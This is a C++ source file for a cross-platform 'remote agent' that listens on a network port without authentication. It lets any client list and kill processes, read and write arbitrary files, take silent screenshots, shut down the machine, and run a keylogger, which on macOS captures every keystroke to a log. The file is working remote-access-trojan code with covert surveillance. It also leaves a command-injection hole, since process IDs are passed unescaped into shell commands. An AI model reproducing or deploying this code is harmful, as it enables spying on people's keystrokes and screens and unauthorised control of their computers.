#include <algorithm>
#include <array>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fstream>
#include <iostream>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#if !defined(_WIN32) && !defined(__APPLE__)
#error "remote_agent supports Windows and macOS only."
#endif

#ifdef _WIN32
#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
using SocketType = SOCKET;
constexpr SocketType INVALID_SOCKET_FD = INVALID_SOCKET;
#elif defined(__APPLE__)
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
using SocketType = int;
constexpr SocketType INVALID_SOCKET_FD = -1;
#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#endif

namespace {
    std::string escapeJson(const std::string& input);
    std::string shellSingleQuote(const std::string& s);
    std::string escapeSingleQuotesPowerShell(const std::string& input);
    std::vector<std::string> splitLines(const std::string& s);

#ifdef __APPLE__
    std::thread g_keyloggerThread;
    std::mutex g_keyloggerMutex;
    bool g_keyloggerRunning = false;
    CFMachPortRef g_keyTap = nullptr;
    CFRunLoopRef g_keyRunLoop = nullptr;
    const char* kKeylogPath = "/tmp/remote_agent_keylogger.log";

    void appendKeylogLine(const std::string& line) {
        std::ofstream out(kKeylogPath, std::ios::app);
        if (!out) return;
        out << line << '\n';
    }

    CGEventRef keyTapCallback(CGEventTapProxy /*proxy*/, CGEventType type, CGEventRef event, void* /*refcon*/) {
        if (type == kCGEventKeyDown) {
            const auto now = std::time(nullptr);
            const auto keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
            appendKeylogLine(std::to_string(static_cast<long long>(now)) + " keycode=" +
                std::to_string(static_cast<long long>(keyCode)));
        }
        return event;
    }

    void keyloggerThreadMain() {
        const auto mask = CGEventMaskBit(kCGEventKeyDown);
        g_keyTap = CGEventTapCreate(
            kCGHIDEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionListenOnly,
            mask,
            keyTapCallback,
            nullptr);

        if (!g_keyTap) {
            appendKeylogLine("ERROR: cannot create event tap (need Input Monitoring permission).");
            std::lock_guard<std::mutex> lock(g_keyloggerMutex);
            g_keyloggerRunning = false;
            return;
        }

        CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, g_keyTap, 0);
        g_keyRunLoop = CFRunLoopGetCurrent();
        CFRunLoopAddSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
        CGEventTapEnable(g_keyTap, true);
        appendKeylogLine("KEYLOGGER_START ok");
        CFRunLoopRun();

        CFRunLoopRemoveSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
        CFRelease(source);
        CFRelease(g_keyTap);
        g_keyTap = nullptr;
        g_keyRunLoop = nullptr;
    }

    std::string keyloggerStartJson() {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        if (g_keyloggerRunning) {
            return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
        }

        std::ofstream reset(kKeylogPath, std::ios::trunc);
        if (!reset) {
            return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
        }

        g_keyloggerRunning = true;
        g_keyloggerThread = std::thread(keyloggerThreadMain);
        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
    }

    std::string keyloggerStopJson() {
        {
            std::lock_guard<std::mutex> lock(g_keyloggerMutex);
            if (!g_keyloggerRunning) {
                return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
            }
            g_keyloggerRunning = false;
        }

        if (g_keyRunLoop) {
            CFRunLoopStop(g_keyRunLoop);
        }
        if (g_keyloggerThread.joinable()) {
            g_keyloggerThread.join();
        }

        std::ifstream in(kKeylogPath);
        std::stringstream ss;
        ss << in.rdbuf();

        return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
    }

    std::string keyloggerGetLogJson() {
        std::ifstream in(kKeylogPath);
        if (!in) {
            return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
                std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
        }

        std::stringstream ss;
        ss << in.rdbuf();

        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
            std::string(g_keyloggerRunning ? "true" : "false") +
            ",\"output\":\"" + escapeJson(ss.str()) + "\"}";
    }

#elif defined(_WIN32)
    std::mutex g_keyloggerMutex;
    bool g_keyloggerRunning = false;
    std::string g_keyloggerLog;

    std::string nowTimeString() {
        const auto now = std::time(nullptr);
        std::tm localTm{};
        localtime_s(&localTm, &now);

        char buf[16];
        std::strftime(buf, sizeof(buf), "%H:%M:%S", &localTm);
        return std::string(buf);
    }

    std::string keyloggerStartJson() {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        g_keyloggerRunning = true;
        g_keyloggerLog.clear();
        g_keyloggerLog += "[" + nowTimeString() + "] START\n";
        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
    }

    std::string keyloggerStopJson() {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        g_keyloggerRunning = false;
        g_keyloggerLog += "\n[" + nowTimeString() + "] STOP\n";
        return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" +
            escapeJson(g_keyloggerLog) + "\"}";
    }

    std::string keyloggerGetLogJson() {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
            std::string(g_keyloggerRunning ? "true" : "false") +
            ",\"output\":\"" + escapeJson(g_keyloggerLog) + "\"}";
    }

    std::string keyloggerClearJson() {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        g_keyloggerLog.clear();
        return "{\"ok\":true,\"command\":\"KEYLOGGER_CLEAR\",\"message\":\"cleared\"}";
    }
#endif

    std::string trim(const std::string& input) {
        const auto start = input.find_first_not_of(" \t\r\n");
        if (start == std::string::npos) return "";
        const auto end = input.find_last_not_of(" \t\r\n");
        return input.substr(start, end - start + 1);
    }

    std::vector<std::string> splitCommand(const std::string& line) {
        std::istringstream stream(line);
        std::vector<std::string> parts;
        std::string token;
        while (stream >> token) {
            parts.push_back(token);
        }
        return parts;
    }

    std::string escapeJson(const std::string& input) {
        std::string out;
        out.reserve(input.size());
        for (char c : input) {
            switch (c) {
            case '\\':
                out += "\\\\";
                break;
            case '"':
                out += "\\\"";
                break;
            case '\n':
                out += "\\n";
                break;
            case '\r':
                out += "\\r";
                break;
            case '\t':
                out += "\\t";
                break;
            default:
                out += c;
                break;
            }
        }
        return out;
    }

    std::string runShellCommand(const std::string& command) {
#ifdef _WIN32
        FILE* pipe = _popen(command.c_str(), "r");
#elif defined(__APPLE__)
        FILE* pipe = popen(command.c_str(), "r");
#endif
        if (!pipe) {
            return "shell_error";
        }

        std::array<char, 512> buffer{};
        std::string output;
        while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
            output += buffer.data();
        }

#ifdef _WIN32
        _pclose(pipe);
#elif defined(__APPLE__)
        pclose(pipe);
#endif
        return trim(output);
    }

    std::string base64Encode(const std::vector<unsigned char>& data) {
        static const char* table =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out;
        out.reserve(((data.size() + 2) / 3) * 4);
        size_t i = 0;
        while (i + 2 < data.size()) {
            const unsigned int n = (static_cast<unsigned int>(data[i]) << 16) |
                (static_cast<unsigned int>(data[i + 1]) << 8) |
                static_cast<unsigned int>(data[i + 2]);
            out.push_back(table[(n >> 18) & 0x3F]);
            out.push_back(table[(n >> 12) & 0x3F]);
            out.push_back(table[(n >> 6) & 0x3F]);
            out.push_back(table[n & 0x3F]);
            i += 3;
        }
        if (i < data.size()) {
            unsigned int n = static_cast<unsigned int>(data[i]) << 16;
            out.push_back(table[(n >> 18) & 0x3F]);
            if (i + 1 < data.size()) {
                n |= static_cast<unsigned int>(data[i + 1]) << 8;
                out.push_back(table[(n >> 12) & 0x3F]);
                out.push_back(table[(n >> 6) & 0x3F]);
                out.push_back('=');
            }
            else {
                out.push_back(table[(n >> 12) & 0x3F]);
                out.push_back('=');
                out.push_back('=');
            }
        }
        return out;
    }

    bool base64Decode(const std::string& input, std::vector<unsigned char>& out) {
        static const std::string chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<int> table(256, -1);
        for (size_t i = 0; i < chars.size(); ++i) {
            table[static_cast<unsigned char>(chars[i])] = static_cast<int>(i);
        }

        out.clear();
        int val = 0;
        int valb = -8;
        for (unsigned char c : input) {
            if (c == '=') break;
            if (c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;
            if (table[c] == -1) return false;
            val = (val << 6) + table[c];
            valb += 6;
            if (valb >= 0) {
                out.push_back(static_cast<unsigned char>((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return true;
    }

    std::string readFileBase64Json(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) {
            return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"open_failed\"}";
        }
        file.seekg(0, std::ios::end);
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        if (size < 0) {
            return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"read_failed\"}";
        }
        std::vector<unsigned char> buffer(static_cast<size_t>(size));
        if (size > 0 && !file.read(reinterpret_cast<char*>(buffer.data()), size)) {
            return "{\"ok\":false,\"command\":\"READ_FILE_BASE64\",\"message\":\"read_failed\"}";
        }
        const std::string b64 = base64Encode(buffer);
        return "{\"ok\":true,\"command\":\"READ_FILE_BASE64\",\"path\":\"" + escapeJson(path) +
            "\",\"data\":\"" + b64 + "\"}";
    }

    bool isBareFileNameForWrite(const std::string& path) {
        if (path.empty()) return false;
        if (path == "." || path == "..") return false;
#ifdef _WIN32
        if (path.find_first_of("/\\:") != std::string::npos) return false;
#elif defined(__APPLE__)
        if (path.find('/') != std::string::npos) return false;
#endif
        return true;
    }

    std::string desktopDirectoryPath() {
#ifdef _WIN32
        const char* profile = std::getenv("USERPROFILE");
        if (!profile || !*profile) return "";
        std::string d(profile);
        while (!d.empty() && (d.back() == '\\' || d.back() == '/')) d.pop_back();
        d += "\\Desktop";
        return d;
#elif defined(__APPLE__)
        const char* home = std::getenv("HOME");
        if (!home || !*home) return "";
        std::string d(home);
        while (!d.empty() && d.back() == '/') d.pop_back();
        d += "/Desktop";
        return d;
#endif
    }

    std::string resolveWritePath(const std::string& path) {
        if (!isBareFileNameForWrite(path)) return path;
        const std::string desk = desktopDirectoryPath();
        if (desk.empty()) return path;
#ifdef _WIN32
        return desk + "\\" + path;
#elif defined(__APPLE__)
        return desk + "/" + path;
#endif
    }

    std::string writeFileBase64Json(const std::string& path, const std::string& dataB64) {
        std::vector<unsigned char> bytes;
        if (!base64Decode(dataB64, bytes)) {
            return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"invalid_base64\"}";
        }
        const std::string resolved = resolveWritePath(path);
        std::ofstream file(resolved, std::ios::binary);
        if (!file) {
            return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"open_failed\"}";
        }
        if (!bytes.empty()) {
            file.write(reinterpret_cast<const char*>(bytes.data()),
                static_cast<std::streamsize>(bytes.size()));
        }
        if (!file) {
            return "{\"ok\":false,\"command\":\"WRITE_FILE_BASE64\",\"message\":\"write_failed\"}";
        }
        const std::string requestedEsc = escapeJson(path);
        const std::string resolvedEsc = escapeJson(resolved);
        return "{\"ok\":true,\"command\":\"WRITE_FILE_BASE64\",\"requested\":\"" + requestedEsc +
            "\",\"path\":\"" + resolvedEsc + "\",\"bytes\":" + std::to_string(bytes.size()) + "}";
    }

#ifdef __APPLE__
    std::string expandTildeUnixPath(const std::string& path) {
        if (path.empty() || path[0] != '~') return path;
        const char* h = std::getenv("HOME");
        if (!h || !*h) return path;
        if (path == "~" || path == "~/") return std::string(h);
        if (path.size() >= 2 && path[1] == '/') return std::string(h) + path.substr(1);
        return path;
    }
#endif

    std::string listFilesJson(const std::string& dirPath) {
#ifdef _WIN32
        const std::string cmd =
            "powershell -NoProfile -Command \"Get-ChildItem -LiteralPath '" +
            escapeSingleQuotesPowerShell(dirPath) +
            "' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"";
#elif defined(__APPLE__)
        const std::string expanded = expandTildeUnixPath(trim(dirPath));
        const std::string cmd =
            "sh -c \"ls -1p " + shellSingleQuote(expanded) + " 2>/dev/null | tr -d '\\r'\"";
#endif
        const std::string out = runShellCommand(cmd);
        std::vector<std::string> lines = splitLines(out);
        std::string items = "[";
        bool firstItem = true;
        for (size_t i = 0; i < lines.size(); ++i) {
#ifdef _WIN32
            if (!firstItem) items += ",";
            firstItem = false;
            items += "\"" + escapeJson(lines[i]) + "\"";
#elif defined(__APPLE__)
            std::string name = lines[i];
            while (!name.empty() && (name.back() == '/' || name.back() == '\\')) name.pop_back();
            if (name.empty()) continue;
            if (!firstItem) items += ",";
            firstItem = false;
            std::string full = expanded;
            if (!full.empty() && full.back() != '/' && full.back() != '\\') full += "/";
            full += name;
            items += "\"" + escapeJson(full) + "\"";
#endif
        }
        items += "]";
        return "{\"ok\":true,\"command\":\"LIST_FILES\",\"dir\":\"" + escapeJson(dirPath) +
            "\",\"items\":" + items + "}";
    }

    std::string listProcesses() {
#ifdef _WIN32
        return runShellCommand("tasklist /FO TABLE");
#elif defined(__APPLE__)
        return runShellCommand("ps -axo pid,comm");
#endif
    }

    std::string joinParts(const std::vector<std::string>& parts, size_t from) {
        std::string s;
        for (size_t i = from; i < parts.size(); ++i) {
            if (i > from) s += ' ';
            s += parts[i];
        }
        return s;
    }

    std::string escapeForDoubleQuotedShell(const std::string& input) {
        std::string out;
        for (char c : input) {
            if (c == '\\' || c == '"') out += '\\';
            out += c;
        }
        return out;
    }

    std::string escapeSingleQuotesPowerShell(const std::string& input) {
        std::string out;
        for (char c : input) {
            if (c == '\'') out += "''";
            else out += c;
        }
        return out;
    }

    std::string stripAppBundleSuffix(const std::string& s) {
        const std::string suffix = ".app";
        if (s.size() > suffix.size() &&
            s.compare(s.size() - suffix.size(), suffix.size(), suffix) == 0) {
            return s.substr(0, s.size() - suffix.size());
        }
        return s;
    }

    std::string escapeAppleScriptString(const std::string& input) {
        std::string out;
        for (char c : input) {
            if (c == '\\' || c == '"') out += '\\';
            out += c;
        }
        return out;
    }

    std::string stopAppByName(const std::string& appName) {
        std::string out;
#ifdef __APPLE__
        const std::string display = stripAppBundleSuffix(appName);
        out = runShellCommand("osascript -e \"tell application \\\"" +
            escapeAppleScriptString(display) + "\\\" to quit\" 2>&1");
#elif defined(_WIN32)
        {
            const std::string n = stripAppBundleSuffix(appName);
            out = runShellCommand(
                "powershell -NoProfile -Command \"Get-Process -Name '" +
                escapeSingleQuotesPowerShell(n) +
                "' -ErrorAction SilentlyContinue | Stop-Process -Force\" 2>&1");
        }
#endif
        return "{\"ok\":true,\"command\":\"STOP_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
    }

    std::string listApplications() {
#ifdef _WIN32
        return runShellCommand(
            "powershell -NoProfile -Command \"Get-ChildItem -LiteralPath $env:ProgramFiles -Directory "
            "-ErrorAction SilentlyContinue | Select-Object -First 45 -ExpandProperty Name\"");
#elif defined(__APPLE__)
        return runShellCommand("ls /Applications 2>/dev/null");
#endif
    }

    std::string toLowerAscii(const std::string& s) {
        std::string r = s;
        for (char& c : r) {
            if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
        }
        return r;
    }

    std::string shellSingleQuote(const std::string& s) {
        std::string r = "'";
        for (char c : s) {
            if (c == '\'') r += "'\\''";
            else r += c;
        }
        r += "'";
        return r;
    }

    std::vector<std::string> splitLines(const std::string& s) {
        std::vector<std::string> out;
        std::istringstream stream(s);
        std::string line;
        while (std::getline(stream, line)) {
            const std::string t = trim(line);
            if (!t.empty()) out.push_back(t);
        }
        return out;
    }

    bool isAppRunning(const std::string& appLine) {
#ifdef __APPLE__
        const std::string pattern = "/" + appLine + "/";
        const std::string cmd = "pgrep -f " + shellSingleQuote(pattern) + " 2>/dev/null | head -1";
        const std::string out = runShellCommand(cmd);
        return !out.empty() && out != "shell_error";
#elif defined(_WIN32)
        const std::string snap = runShellCommand("tasklist /FO CSV /NH");
        if (snap.empty() || snap == "shell_error") return false;
        const std::string lowerSnap = toLowerAscii(snap);
        const std::string lowerName = toLowerAscii(appLine);
        return lowerSnap.find(lowerName) != std::string::npos;
#endif
    }

    std::string captureScreenshotBase64(std::string& errorOut) {
#ifdef _WIN32
        const std::string cmd =
            "powershell -NoProfile -Command \"$ErrorActionPreference='Stop'; "
            "Add-Type -AssemblyName System.Windows.Forms; "
            "Add-Type -AssemblyName System.Drawing; "
            "$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
            "$bmp=New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height); "
            "$g=[System.Drawing.Graphics]::FromImage($bmp); "
            "$g.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size); "
            "$ms=New-Object System.IO.MemoryStream; "
            "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png); "
            "$g.Dispose(); "
            "$bmp.Dispose(); "
            "[Convert]::ToBase64String($ms.ToArray())\" 2>&1";
#elif defined(__APPLE__)
        const std::string cmd =
            "sh -c 'tmp=\"/tmp/rca_shot_$$.png\"; "
            "screencapture -x -t png \"$tmp\" >/dev/null 2>&1 && "
            "base64 < \"$tmp\" | tr -d \"\\n\"; "
            "rc=$?; rm -f \"$tmp\"; exit $rc' 2>/dev/null";
#endif
        const std::string out = runShellCommand(cmd);
        if (out.empty() || out == "shell_error") {
            errorOut = "screenshot_failed_or_permission_denied";
            return "";
        }
        return out;
    }

    std::string screenshotJsonResponse() {
        std::string error;
        const std::string b64 = captureScreenshotBase64(error);
        if (b64.empty()) {
            return "{\"ok\":false,\"command\":\"SCREENSHOT\",\"message\":\"" + escapeJson(error) + "\"}";
        }
        return "{\"ok\":true,\"command\":\"SCREENSHOT\",\"mime\":\"image/png\",\"data\":\"" +
            escapeJson(b64) + "\"}";
    }

    std::string listApplicationsWithStatusJson() {
        const std::string list = listApplications();
        const std::vector<std::string> lines = splitLines(list);
        std::string items = "[";
        for (size_t i = 0; i < lines.size(); ++i) {
            if (i > 0) items += ",";
            const bool running = isAppRunning(lines[i]);
            items += "{\"name\":\"" + escapeJson(lines[i]) + "\",\"running\":" +
                (running ? "true" : "false") + "}";
        }
        items += "]";
        return "{\"ok\":true,\"command\":\"LIST_APPS\",\"items\":" + items + ",\"output\":\"" +
            escapeJson(list) + "\"}";
    }

    std::string killProcessByPid(const std::string& pid, const std::string& commandLabel) {
#ifdef _WIN32
        const std::string out = runShellCommand("taskkill /PID " + pid + " /F 2>&1");
#elif defined(__APPLE__)
        const std::string out = runShellCommand("kill -9 " + pid + " 2>&1");
#endif
        return "{\"ok\":true,\"command\":\"" + escapeJson(commandLabel) +
            "\",\"output\":\"" + escapeJson(out) + "\"}";
    }

    std::string commandNotImplemented(const std::string& cmd) {
        return "{\"ok\":false,\"command\":\"" + escapeJson(cmd) +
            "\",\"message\":\"not_implemented_yet\"}";
    }

    std::string shutdownOrRestartJson(const std::string& commandLabel) {
        std::string out;
#ifdef _WIN32
        if (commandLabel == "SHUTDOWN") {
            out = runShellCommand("shutdown /s /f /t 0 2>&1");
        }
        else {
            out = runShellCommand("shutdown /r /f /t 0 2>&1");
        }
#elif defined(__APPLE__)
        if (commandLabel == "SHUTDOWN") {
            out = runShellCommand(
                "osascript -e 'tell application \"System Events\" to shut down' 2>&1");
        }
        else {
            out = runShellCommand(
                "osascript -e 'tell application \"System Events\" to restart' 2>&1");
        }
#endif
        const bool shellFailed = (out == "shell_error");
        if (shellFailed) {
            return "{\"ok\":false,\"command\":\"" + escapeJson(commandLabel) +
                "\",\"message\":\"shell_failed\",\"output\":\"\"}";
        }
        return "{\"ok\":true,\"command\":\"" + escapeJson(commandLabel) +
            "\",\"output\":\"" + escapeJson(out) + "\"}";
    }

    std::string processCommand(const std::string& rawLine) {
        const auto line = trim(rawLine);
        const auto parts = splitCommand(line);
        if (parts.empty()) {
            return "{\"ok\":false,\"message\":\"empty_command\"}";
        }

        const std::string& cmd = parts[0];

        if (cmd == "PING") {
            return "{\"ok\":true,\"message\":\"pong\"}";
        }
        if (cmd == "LIST_PROCESSES") {
            return "{\"ok\":true,\"command\":\"LIST_PROCESSES\",\"output\":\"" +
                escapeJson(listProcesses()) + "\"}";
        }
        if (cmd == "KILL_PROCESS" && parts.size() >= 2) {
            return killProcessByPid(parts[1], "KILL_PROCESS");
        }
        if (cmd == "STOP_APP_BY_PID" && parts.size() >= 2) {
            return killProcessByPid(parts[1], "STOP_APP_BY_PID");
        }
        if (cmd == "LIST_APPS") {
            return listApplicationsWithStatusJson();
        }
        if ((cmd == "START_APP_BY_NAME" || cmd == "START_PROCESS") && parts.size() >= 2) {
            const std::string appName = joinParts(parts, 1);
            std::string out;
#ifdef _WIN32
            out = runShellCommand(
                "powershell -NoProfile -Command \"Start-Process '" +
                escapeSingleQuotesPowerShell(appName) + "'\" 2>&1");
#elif defined(__APPLE__)
            out = runShellCommand("open -a \"" + escapeForDoubleQuotedShell(appName) + "\" 2>&1");
#endif
            return "{\"ok\":true,\"command\":\"START_APP_BY_NAME\",\"output\":\"" + escapeJson(out) + "\"}";
        }
        if (cmd == "STOP_APP_BY_NAME" && parts.size() >= 2) {
            const std::string appName = joinParts(parts, 1);
            return stopAppByName(appName);
        }
        if (cmd == "READ_FILE_BASE64" && parts.size() >= 2) {
            return readFileBase64Json(joinParts(parts, 1));
        }
        if (cmd == "WRITE_FILE_BASE64" && parts.size() >= 3) {
            const std::string dataB64 = parts[1];
            const std::string path = joinParts(parts, 2);
            return writeFileBase64Json(path, dataB64);
        }
        if (cmd == "LIST_FILES" && parts.size() >= 2) {
            return listFilesJson(joinParts(parts, 1));
        }
        if (cmd == "KEYLOGGER_START") {
            return keyloggerStartJson();
        }
        if (cmd == "KEYLOGGER_STOP") {
            return keyloggerStopJson();
        }
        if (cmd == "KEYLOGGER_ADD" && parts.size() >= 2) {
#ifdef _WIN32
            std::lock_guard<std::mutex> lock(g_keyloggerMutex);

            if (g_keyloggerRunning) {
                const std::string key = joinParts(parts, 1);

                if (key == "[Enter]") {
                    g_keyloggerLog += "\n[" + nowTimeString() + "] ";
                }
                else if (key == "[Backspace]") {
                    if (!g_keyloggerLog.empty()) {
                        g_keyloggerLog.pop_back();
                    }
                }
                else if (key == "[Space]") {
                    g_keyloggerLog += " ";
                }
                else {
                    g_keyloggerLog += key;
                }
            }
#endif
            return "{\"ok\":true,\"command\":\"KEYLOGGER_ADD\",\"message\":\"logged\"}";
        }
        if (cmd == "KEYLOGGER_CLEAR") {
            return keyloggerClearJson();
        }
        if (cmd == "KEYLOGGER_GET_LOG") {
            return keyloggerGetLogJson();
        }
        if (cmd == "SCREENSHOT") {
            return screenshotJsonResponse();
        }
        if (cmd == "SHUTDOWN") {
            return shutdownOrRestartJson("SHUTDOWN");
        }
        if (cmd == "RESTART") {
            return shutdownOrRestartJson("RESTART");
        }
        if (cmd == "START_APP" || cmd == "STOP_APP" || cmd == "COPY_FILE" ||
            cmd == "WEBCAM_START" || cmd == "WEBCAM_RECORD_START" || cmd == "WEBCAM_RECORD_STOP") {
            return commandNotImplemented(cmd);
        }

        return "{\"ok\":false,\"message\":\"unknown_command\",\"command\":\"" + escapeJson(cmd) + "\"}";
    }

    void closeSocket(SocketType fd) {
#ifdef _WIN32
        closesocket(fd);
#elif defined(__APPLE__)
        close(fd);
#endif
    }

    void handleClient(SocketType clientFd) {
        std::array<char, 1024> buffer{};
        std::string data;

        while (true) {
#ifdef _WIN32
            const int bytesRead = recv(clientFd, buffer.data(), static_cast<int>(buffer.size()), 0);
#elif defined(__APPLE__)
            const int bytesRead = static_cast<int>(recv(clientFd, buffer.data(), buffer.size(), 0));
#endif
            if (bytesRead <= 0) break;
            data.append(buffer.data(), bytesRead);
            auto newlinePos = data.find('\n');
            if (newlinePos != std::string::npos) {
                const std::string line = data.substr(0, newlinePos);
                const std::string response = processCommand(line) + "\n";
#ifdef _WIN32
                send(clientFd, response.c_str(), static_cast<int>(response.size()), 0);
#elif defined(__APPLE__)
                send(clientFd, response.c_str(), response.size(), 0);
#endif
                break;
            }
        }

        closeSocket(clientFd);
    }

    bool initSockets() {
#ifdef _WIN32
        WSADATA wsData{};
        return WSAStartup(MAKEWORD(2, 2), &wsData) == 0;
#elif defined(__APPLE__)
        return true;
#endif
    }

    void shutdownSockets() {
#ifdef _WIN32
        WSACleanup();
#endif
    }

}  // namespace

int main(int argc, char* argv[]) {
    int port = 5050;
    if (argc >= 2) {
        port = std::atoi(argv[1]);
        if (port <= 0) {
            std::cerr << "Invalid port.\n";
            return 1;
        }
    }

    if (!initSockets()) {
        std::cerr << "Socket init failed.\n";
        return 1;
    }

    SocketType serverFd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverFd == INVALID_SOCKET_FD) {
        std::cerr << "Cannot create socket.\n";
        shutdownSockets();
        return 1;
    }

    int opt = 1;
#ifdef _WIN32
    setsockopt(serverFd, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&opt), sizeof(opt));
#elif defined(__APPLE__)
    setsockopt(serverFd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#endif

    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(static_cast<uint16_t>(port));

    if (bind(serverFd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) < 0) {
        std::cerr << "Bind failed on port " << port << ".\n";
        closeSocket(serverFd);
        shutdownSockets();
        return 1;
    }

    if (listen(serverFd, 16) < 0) {
        std::cerr << "Listen failed.\n";
        closeSocket(serverFd);
        shutdownSockets();
        return 1;
    }

    std::cout << "Remote agent listening on port " << port << '\n';

    while (true) {
        sockaddr_in clientAddr{};
#ifdef _WIN32
        int clientLen = sizeof(clientAddr);
        SocketType clientFd = accept(serverFd, reinterpret_cast<sockaddr*>(&clientAddr), &clientLen);
#elif defined(__APPLE__)
        socklen_t clientLen = sizeof(clientAddr);
        SocketType clientFd = accept(serverFd, reinterpret_cast<sockaddr*>(&clientAddr), &clientLen);
#endif
        if (clientFd == INVALID_SOCKET_FD) {
            continue;
        }
        std::thread worker(handleClient, clientFd);
        worker.detach();
    }

    closeSocket(serverFd);
    shutdownSockets();
    return 0;
}